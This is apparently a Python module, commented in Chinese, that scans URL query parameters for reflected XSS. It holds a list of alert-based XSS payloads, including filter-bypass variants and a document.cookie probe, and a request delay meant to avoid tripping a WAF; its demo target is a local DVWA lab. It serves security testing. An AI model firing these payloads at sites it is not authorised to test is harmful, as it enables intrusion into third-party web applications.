#!/usr/bin/env python3
"""
XSS（跨站脚本攻击）检测模块
支持反射型XSS检测
"""

import requests
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# 控制台颜色
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'


class XSSScanner:
    """
    XSS检测器类
    
    检测原理：
    1. 提取URL中的查询参数
    2. 对每个参数注入XSS payload
    3. 检查响应中是否原样包含payload（且未被HTML编码）
    4. 如果包含，说明存在反射型XSS
    """

    def __init__(self, base_url, threads=10, timeout=5, verbose=False, delay=0.1, cookies=None):
        """
        初始化扫描器
        
        参数：
            base_url: 目标URL
            threads: 线程数
            timeout: 请求超时（秒）
            verbose: 是否显示详细输出
            delay: 每次请求间隔（秒），避免触发WAF
            cookies: 字典形式的Cookie（用于保持登录状态）
        """
        self.base_url = base_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.delay = delay

        # 创建会话
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'CyberEagle-Scanner/0.2.0 (https://github.com/yukon61/CyberEagle-Scanner)'
        })

        # 如果传入了Cookie，设置到会话中
        if cookies:
            self.session.cookies.update(cookies)

        self.results = []
        self.lock = threading.Lock()

        # ---------- XSS Payload 列表 ----------
        # 覆盖多种注入场景：
        # 1. 标签注入：<script>, <img>, <svg>, <body>, <input>
        # 2. 属性注入：通过闭合引号和尖括号提前退出属性
        # 3. 大小写混淆：绕过简单的过滤器
        # 4. 编码绕过：HTML实体编码、Unicode
        self.payloads = [
            # ---- 基础标签注入 ----
            '<script>alert(1)</script>',
            '<ScRiPt>alert(1)</sCrIpT>',           # 大小写混淆
            '<script>alert(document.cookie)</script>',
            '<script>alert(document.domain)</script>',
            
            # ---- 事件驱动（无需 <script> 标签） ----
            '<img src=x onerror=alert(1)>',
            '<img src="x" onerror="alert(1)">',
            '<body onload=alert(1)>',
            '<svg onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<video src=x onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            
            # ---- 属性注入（闭合引号和标签） ----
            '"><script>alert(1)</script>',          # 双引号闭合
            "'><script>alert(1)</script>",          # 单引号闭合
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            
            # ---- 绕过 WAF/过滤器 ----
            '<scr<script>ipt>alert(1)</scr</script>ipt>',  # 双写绕过
            '<script>alert(1)</script>',            # 使用反引号
            '<img src=x onerror=this.onerror="";alert(1)>',  # 防止递归
            '<a href="javascript:alert(1)">click</a>',
            '<iframe src="javascript:alert(1)">',
            
            # ---- HTML 实体编码（测试是否解码） ----
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
        ]

    def get_url_params(self, url):
        """
        提取URL中的查询参数
        
        例如：http://a.com/page.php?id=1&name=test
        返回：{'id': '1', 'name': 'test'}
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] if v else '' for k, v in params.items()}

    def build_payload_url(self, url, param, payload):
        """
        构造带 payload 的测试 URL
        
        例如：
            url = "http://a.com/page.php?id=1"
            param = "id"
            payload = "<script>alert(1)</script>"
            → "http://a.com/page.php?id=<script>alert(1)</script>"
        """
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        # 替换目标参数的值
        query_params[param] = [payload]
        
        # 重新构建查询字符串
        new_query = urlencode(query_params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        return new_url

    def is_reflected_xss(self, url, param, payload):
        """
        检测单个参数是否存在反射型XSS
        
        原理：
        1. 构造包含 payload 的 URL
        2. 发送 GET 请求
        3. 检查响应内容是否原样包含 payload（且未被HTML编码）
        
        注意：payload 可能被 URL 编码（如 < 变成 %3C），
        但服务器返回时，如果存在 XSS，应该是解码后的原始字符串。
        """
        # 构造测试 URL
        test_url = self.build_payload_url(url, param, payload)
        
        # 添加延迟，防止触发WAF
        time.sleep(self.delay)
        
        try:
            resp = self.session.get(test_url, timeout=self.timeout)
            
            # 检查响应文本中是否包含 payload
            # 注意：payload 中的特殊字符在响应中可能被编码或转义
            # 但最简单的判断：如果原样包含，基本可以确定存在 XSS
            
            # 情况1：直接包含完整 payload
            if payload in resp.text:
                return True, test_url, '原始payload未编码'
            
            # 情况2：payload 被 HTML 实体编码（说明被过滤了，不算漏洞）
            # 例如 < 变成 &lt;，这种不算 XSS
            # 所以我们只认“没有被编码”的情况
            # 上面 payload in resp.text 已经能覆盖大多数场景
            
        except Exception as e:
            if self.verbose:
                print(f"  [调试] {param}={payload} 请求失败: {e}")
        
        return False, None, None

    def scan(self):
        """
        执行完整的 XSS 扫描
        
        流程：
        1. 提取 URL 中的查询参数
        2. 对每个参数注入所有 payload
        3. 检查响应是否原样包含 payload
        4. 输出检测结果
        """
        print(f"\n[+] 开始 XSS 检测")
        print(f"[+] 目标: {self.base_url}")
        print(f"[+] 线程数: {self.threads}")
        print(f"[+] 加载了 {len(self.payloads)} 个 XSS Payload")
        print("-" * 60)
        
        # ---- 第1步：提取 URL 参数 ----
        params = self.get_url_params(self.base_url)
        if not params:
            print("[!] 未检测到 URL 参数")
            return []
        
        print(f"[+] 发现 {len(params)} 个 URL 参数: {list(params.keys())}")
        
        results = []
        total_tests = len(params) * len(self.payloads)
        completed = 0
        
        # ---- 第2步：对每个参数进行检测 ----
        for param, value in params.items():
            print(f"\n[*] 测试参数: {param} = {value}")
            
            found = False
            
            for payload in self.payloads:
                completed += 1
                
                # 显示进度
                if self.verbose or completed % 10 == 0:
                    print(f"\r  进度: {completed}/{total_tests} ({int(completed/total_tests*100)}%)", end='', flush=True)
                
                # 检测是否存在 XSS
                is_vuln, test_url, detail = self.is_reflected_xss(self.base_url, param, payload)
                
                if is_vuln:
                    if not found:
                        # 只在第一次发现时打印
                        print(f"\n  {GREEN}✅ 发现反射型 XSS!{RESET}")
                        found = True
                    
                    print(f"     Payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")
                    results.append({
                        'type': 'reflected-xss',
                        'param': param,
                        'payload': payload,
                        'url': test_url,
                        'details': detail
                    })
                    # 一个参数只要发现一个 payload 有效，就记录并继续（避免刷屏）
                    # 但仍继续测试其他 payload，看是否还有更多
                    
            if not found:
                print(f"\n  ❌ 未发现 XSS")
        
        print("\n" + "-" * 60)
        print(f"[+] XSS检测完成！共发现 {len(results)} 个疑似漏洞")
        
        for r in results:
            print(f"  {GREEN}✅{RESET} [{r['type']}] {r['param']} -> {r['details']}")
            print(f"     Payload: {r['payload'][:60]}")
        
        return results


# ==================== 独立测试 ====================
if __name__ == "__main__":
    # 测试DVWA的XSS Reflected关卡
    scanner = XSSScanner(
        base_url="http://127.0.0.1/vulnerabilities/xss_r/?name=test",
        verbose=True
    )
    results = scanner.scan()
